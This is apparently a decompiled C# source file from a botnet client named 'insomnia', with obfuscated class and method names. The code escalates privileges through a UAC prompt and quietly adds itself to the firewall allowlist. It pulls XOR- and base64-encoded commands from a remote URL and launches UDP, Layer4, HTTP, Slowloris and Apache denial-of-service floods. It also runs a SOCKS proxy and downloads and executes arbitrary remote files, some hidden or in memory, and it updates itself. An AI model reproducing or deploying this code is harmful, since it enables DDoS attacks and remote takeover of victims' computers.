using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace insomnia;

internal class Class33
{
	public static bool Field1;

	public static void Method28()
	{
		if (Class39.Method20() == "u" && Method27(Class26.Field20))
		{
			Environment.Exit(-1);
		}
	}

	private static bool Method27(string A_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Verb = "runas";
		processStartInfo.FileName = A_0;
		try
		{
			Process.Start(processStartInfo);
			Class31.Method3("Acquired administrative permissions! Restarting...", Class26.Field8);
			return true;
		}
		catch
		{
			Class31.Method3("UAC Elevation request was declined.", Class26.Field8);
		}
		return false;
	}

	public static string Method26()
	{
		return "[ver='" + Class26.Field17 + "' hash='" + Class26.Field16 + "' proc='" + Class26.Field20 + "' reg='" + Class13.Field5 + "']";
	}

	public static void Method25(string A_0)
	{
		try
		{
			WebClient webClient = new WebClient();
			string a_ = webClient.DownloadString(A_0);
			Class31.Method3("[READ]: Performing commands from " + A_0, Class31.Field1);
			Method23(a_);
		}
		catch
		{
		}
	}

	public static void Method24()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "/C netsh firewall add allowedprogram \"" + Class26.Field20 + "\" \"" + Class26.Field5 + "\" ENABLE";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
	}

	public static void Method23(string A_0)
	{
		try
		{
			string a_ = "";
			string a_2 = "";
			string a_3 = "";
			string a_4 = "";
			string text = Method4(A_0);
			string[] array = text.Split(new char[1] { '|' });
			string a_5 = Method4(array[0]);
			string text2 = array[1];
			if (!(text2 == Class26.Field12))
			{
				return;
			}
			int a_6 = Convert.ToInt32(text2.Substring(5, 3));
			string text3 = Method6(a_5, a_6).Replace(" .", ".");
			string[] array2 = text3.Split(new char[1] { '|' });
			string[] array3 = array2;
			foreach (string text4 in array3)
			{
				string[] array4 = text4.Split(new char[1] { ' ' });
				try
				{
					a_ = array4[1];
					a_2 = array4[2];
					a_3 = array4[3];
					a_4 = array4[4];
				}
				catch
				{
				}
				Class31.Method4(array4[0], Class31.Field1, a_, a_2, a_3, a_4, array4);
			}
		}
		catch
		{
		}
	}

	public static void Method22(string A_0, string A_1)
	{
		try
		{
			Process process = new Process();
			if (A_1 == "-h")
			{
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.FileName = A_0;
				process.Start();
				Class31.Method3("[OPEN]: " + A_0 + " was opened hidden.", Class31.Field1);
				process.Dispose();
			}
			else
			{
				process.StartInfo.FileName = A_0;
				process.Start();
				Class31.Method3("[OPEN]: " + A_0 + " was opened.", Class31.Field1);
				process.Dispose();
			}
		}
		catch
		{
		}
	}

	public static void Method21(string A_0, string A_1, string A_2)
	{
		try
		{
			Method16(A_0: false);
			Class40.Field8 = A_0;
			Class40.Field6 = Convert.ToInt32(A_1);
			Class40.Field3 = 50;
			Class40.Field2 = 50;
			Class40.Field5 = 128;
			int millisecondsTimeout = Convert.ToInt32(A_1) * 1000;
			Class31.Method3("[UDP]: Flooding started on " + A_0 + ":" + A_1 + " for " + A_2 + " seconds.", Class26.Field8);
			Class40.Method2();
			Class40.Field1 = true;
			Thread.Sleep(millisecondsTimeout);
			if (Class40.Field1)
			{
				Method16(A_0: false);
				Class31.Method3("[UDP]: Flooding finished on " + A_0 + ":" + A_1, Class26.Field8);
			}
		}
		catch
		{
		}
	}

	public static void Method20(string A_0, string A_1)
	{
		try
		{
			if (A_0 != "" && A_0 != " " && A_0 != null)
			{
				Method16(A_0: false);
				string field = A_0;
				if (!A_0.Contains("http:"))
				{
					field = "http://" + A_0;
				}
				int millisecondsTimeout = Convert.ToInt32(A_1) * 1000;
				Class15.Field5 = field;
				Class31.Method3("[LAYER7]: Flooding started on " + A_0 + " for " + A_1 + " seconds.", Class26.Field8);
				Class15.Method2();
				Class15.Field3 = true;
				Thread.Sleep(millisecondsTimeout);
				if (Class15.Field3)
				{
					Method16(A_0: false);
					Class31.Method3("[LAYER7]: Flooding finished on " + A_0, Class26.Field8);
				}
			}
		}
		catch
		{
		}
	}

	public static void Method19(string A_0, string A_1, string A_2)
	{
		try
		{
			if (A_0 != "" && A_0 != " " && A_0 != null)
			{
				Method16(A_0: false);
				Class22.Field7 = A_0;
				Class22.Field5 = Convert.ToInt32(A_1);
				Class22.Field2 = 50;
				Class22.Field3 = 50;
				int millisecondsTimeout = Convert.ToInt32(A_1) * 1000;
				Class31.Method3("[LAYER4]: Flooding started on " + A_0 + ":" + A_1 + " for " + A_2 + " seconds.", Class26.Field8);
				Class22.Method2();
				Class22.Field1 = true;
				Thread.Sleep(millisecondsTimeout);
				if (Class22.Field1)
				{
					Method16(A_0: false);
					Class31.Method3("[LAYER4]: Flooding finished on " + A_0 + ":" + A_1, Class26.Field8);
				}
			}
		}
		catch
		{
		}
	}

	public static void Method18(string A_0, string A_1)
	{
		try
		{
			if (A_0 != "" && A_0 != " " && A_0 != null)
			{
				Method16(A_0: false);
				Class36.Field7 = A_0;
				Class36.Field4 = 80;
				Class36.Field5 = 200;
				int millisecondsTimeout = Convert.ToInt32(A_1) * 1000;
				Class31.Method3("[SLOWLORIS]: Flooding started on " + A_0 + " for " + A_1 + " seconds.", Class26.Field8);
				Class36.Method4();
				Class36.Field3 = true;
				Thread.Sleep(millisecondsTimeout);
				if (Class36.Field3)
				{
					Method16(A_0: false);
					Class31.Method3("[SLOWLORIS]: Flooding finished on " + A_0, Class26.Field8);
				}
			}
		}
		catch
		{
		}
	}

	public static void Method17(string A_0, string A_1)
	{
		try
		{
			if (A_0 != "" && A_0 != " " && A_0 != null)
			{
				Method16(A_0: false);
				Class20.Field7 = A_0;
				Class20.Field6 = 80;
				Class20.Field5 = 100;
				int millisecondsTimeout = Convert.ToInt32(A_1) * 1000;
				Class31.Method3("[APACHE-RME]: Flooding started on " + A_0 + " for " + A_1 + " seconds.", Class26.Field8);
				Class20.Method3();
				Class20.Field1 = true;
				Thread.Sleep(millisecondsTimeout);
				if (Class20.Field1)
				{
					Method16(A_0: false);
					Class31.Method3("[APACHE-RME]: Flooding finished on " + A_0, Class26.Field8);
				}
			}
		}
		catch
		{
		}
	}

	public static void Method16(bool A_0)
	{
		try
		{
			if (Class15.Field3)
			{
				Class15.Method1();
				Class15.Field3 = false;
				if (A_0)
				{
					Class31.Method3("[LAYER7]: Flooding aborted.", Class31.Field1);
				}
			}
			if (Class22.Field1)
			{
				Class22.Method1();
				Class22.Field1 = false;
				if (A_0)
				{
					Class31.Method3("[LAYER4]: Flooding aborted.", Class31.Field1);
				}
			}
			if (Class40.Field1)
			{
				Class40.Method1();
				Class40.Field1 = false;
				if (A_0)
				{
					Class31.Method3("[UDP]: Flooding aborted.", Class31.Field1);
				}
			}
			if (Class36.Field3)
			{
				Class36.Method3();
				Class36.Field3 = false;
				if (A_0)
				{
					Class31.Method3("[SLOWLORIS]: Flooding aborted.", Class31.Field1);
				}
			}
			if (Class20.Field1)
			{
				Class20.Method2();
				Class20.Field1 = false;
				if (A_0)
				{
					Class31.Method3("[APACHE-RME]: Flooding aborted.", Class31.Field1);
				}
			}
		}
		catch
		{
		}
	}

	public static void Method15()
	{
		try
		{
			Method24();
		}
		catch
		{
		}
		try
		{
			if (!Field1)
			{
				Class31.Method3("[SOCKS]: Attempting to start SOCKS server...", Class31.Field1);
				Thread thread = new Thread(Class25.Method3);
				thread.IsBackground = true;
				thread.Start();
				Field1 = true;
			}
			else
			{
				Class31.Method3(Class25.Field2, Class31.Field1);
			}
		}
		catch
		{
		}
	}

	public static void Method14()
	{
		try
		{
			Class39.Method2("uninstalling");
		}
		catch
		{
		}
	}

	public static void Method13()
	{
		Thread thread = new Thread(Class27.Method2);
		thread.IsBackground = true;
		thread.Start();
	}

	public static void Method12()
	{
		Thread thread = new Thread(Class27.Method1);
		thread.IsBackground = true;
		thread.Start();
	}

	public static void Method11(string A_0)
	{
		if (A_0 == "-i")
		{
			Thread thread = new Thread(Class28.Method1);
			thread.IsBackground = true;
			thread.Start();
		}
		else
		{
			Thread thread2 = new Thread(Class28.Method5);
			thread2.IsBackground = true;
			thread2.Start();
		}
	}

	public static void Method10()
	{
		try
		{
			Class31.Method3("[antivirus='" + Class39.Method9() + "' firewall='" + Class39.Method8() + "']", Class31.Field1);
		}
		catch
		{
		}
	}

	public static void Method9(string A_0)
	{
		try
		{
			if (A_0 != "")
			{
				string text = "uqcvw" + ".tmp";
				WebClient webClient = new WebClient();
				Stopwatch stopwatch = Stopwatch.StartNew();
				Class31.Method3("[SPEEDTEST]: Starting download on " + A_0, Class31.Field1);
				webClient.DownloadFile(A_0, text);
				stopwatch.Stop();
				FileInfo fileInfo = new FileInfo(text);
				long a_ = fileInfo.Length / stopwatch.Elapsed.Seconds;
				Class31.Method3("[SPEEDTEST]: Download complete. [size='" + Class39.Method7(fileInfo.Length) + "' speed='" + Class39.Method7(a_) + "ps']", Class31.Field1);
				File.Delete(text);
			}
		}
		catch
		{
		}
	}

	public static void Method8(string A_0, string A_1)
	{
		if (!(A_0 != "") && !(A_1 != ""))
		{
			return;
		}
		try
		{
			string text = "arsaz" + ".exe";
			WebClient webClient = new WebClient();
			webClient.DownloadFile(A_0, text);
			string text2 = Class39.Method15(text);
			if (Class26.Field16.ToLower() == A_1.ToLower())
			{
				Class31.Method3("[UPDATE]: Bot file is already latest version.", Class31.Field1);
			}
			else if (text2.ToLower() == A_1.ToLower())
			{
				Class31.Method3("[UPDATE]: Bot file updated.", Class31.Field1);
				Process process = new Process();
				process.StartInfo.FileName = text;
				process.Start();
				process.Dispose();
				Class39.Method2("updating...");
			}
			else
			{
				Class31.Method3("[UPDATE]: MD5 Mismatch ['" + text2.ToLower() + "' != '" + A_1.ToLower() + "']", Class31.Field1);
			}
		}
		catch
		{
		}
	}

	public static void Method7(string A_0, string A_1, string A_2)
	{
		try
		{
			string text = Environment.GetEnvironmentVariable("APPDATA") + "\\" + "mndpb" + ".exe";
			WebClient webClient = new WebClient();
			webClient.DownloadFile(A_0, text);
			FileInfo fileInfo = new FileInfo(text);
			if (A_1 == "-t" && A_2 != "")
			{
				try
				{
					string field = Class26.Field8;
					int num = Convert.ToInt32(A_2);
					int millisecondsTimeout = num * 1000 * 60;
					Process process = new Process();
					process.StartInfo.FileName = text;
					string fullName = fileInfo.FullName;
					process.Start();
					Class31.Method3("Executing file for " + num + " minutes [file='" + fileInfo.FullName + "' size='" + fileInfo.Length + " bytes' type='" + Class39.Method16(fileInfo.FullName) + "']", field);
					Thread.Sleep(millisecondsTimeout);
					try
					{
						process.Kill();
						Class31.Method3("Removing file [file='" + fileInfo.FullName + "' proc='" + process.ProcessName + "']", field);
						process.WaitForExit();
						File.Delete(fullName);
						return;
					}
					catch
					{
						return;
					}
				}
				catch
				{
					return;
				}
			}
			if (A_1 == "-m" && Class39.Method16(fileInfo.FullName).Contains(".NET"))
			{
				try
				{
					Class39.Method6(fileInfo.FullName);
					Class31.Method3("Executed file into memory [file='" + fileInfo.FullName + "' size='" + fileInfo.Length + " bytes' proc='" + Class26.Field20 + "']", Class31.Field1);
					return;
				}
				catch
				{
					return;
				}
			}
			if (A_1 == "-r")
			{
				try
				{
					Thread thread = new Thread(Class19.Method4);
					thread.IsBackground = true;
					thread.Start();
					Process process2 = new Process();
					process2.StartInfo.FileName = text;
					process2.Start();
					Class31.Method3("Executed file with Ruskill [file='" + fileInfo.FullName + "' size='" + fileInfo.Length + " bytes' type='" + Class39.Method16(fileInfo.FullName) + "' id='" + process2.Id + "']", Class31.Field1);
					if (File.Exists(text))
					{
						if (Class35.Method1(text))
						{
							Class31.Method3("[RUSKILL]: File successfully marked for deletion upon reboot -> " + text, Class26.Field3);
						}
						else
						{
							Class31.Method3("[RUSKILL]: Will attempt to prevent file from starting next reboot -> " + text, Class26.Field3);
						}
					}
					string text2 = Method3(process2.ProcessName);
					if (text2 != "")
					{
						Class31.Method3("[RUSKILL]: Outgoing connection detected from " + process2.ProcessName + " -> " + text2, Class26.Field8);
					}
					process2.Dispose();
					Thread.Sleep(15000);
					thread.Suspend();
					return;
				}
				catch
				{
					return;
				}
			}
			if (A_0 != "")
			{
				Process process3 = new Process();
				process3.StartInfo.FileName = text;
				process3.Start();
				Class31.Method3("Executed file [file='" + fileInfo.FullName + "' size='" + fileInfo.Length + " bytes' type='" + Class39.Method16(fileInfo.FullName) + "']", Class31.Field1);
				process3.Dispose();
			}
		}
		catch (WebException ex)
		{
			string text3 = "Could not download the file.";
			if (ex.Message.Contains("404"))
			{
				text3 = "404 file not found";
			}
			if (ex.Message.Contains("460"))
			{
				text3 = "460 access restricted";
			}
			Class31.Method3("Error Downloading [" + text3 + "]", Class31.Field1);
		}
	}

	public static string Method6(string A_0, int A_1)
	{
		StringBuilder stringBuilder = new StringBuilder(A_0);
		StringBuilder stringBuilder2 = new StringBuilder(A_0.Length);
		for (int i = 0; i < A_0.Length; i++)
		{
			char c = stringBuilder[i];
			c = (char)(c ^ A_1);
			stringBuilder2.Append(c);
		}
		return stringBuilder2.ToString();
	}

	public static string Method5(string A_0)
	{
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(A_0));
	}

	public static string Method4(string A_0)
	{
		byte[] bytes = Convert.FromBase64String(A_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static string Method3(string A_0)
	{
		string text = Method1();
		if (text != "error")
		{
			string[] array = text.Split(new string[2] { "\r\n", "\n" }, StringSplitOptions.None);
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				if (text2.Contains("TCP"))
				{
					string[] array3 = Regex.Split(text2, "\\s+");
					if (Process.GetProcessById(Convert.ToInt32(array3[5])).ProcessName == A_0)
					{
						return array3[3];
					}
				}
			}
		}
		return "";
	}

	public static string[] Method2()
	{
		return Method1().Split(new string[2] { "\r\n", "\n" }, StringSplitOptions.None);
	}

	private static string Method1()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "netstat.exe";
			process.StartInfo.Arguments = "-n -o";
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			return process.StandardOutput.ReadToEnd();
		}
		catch
		{
			return "error";
		}
	}
}
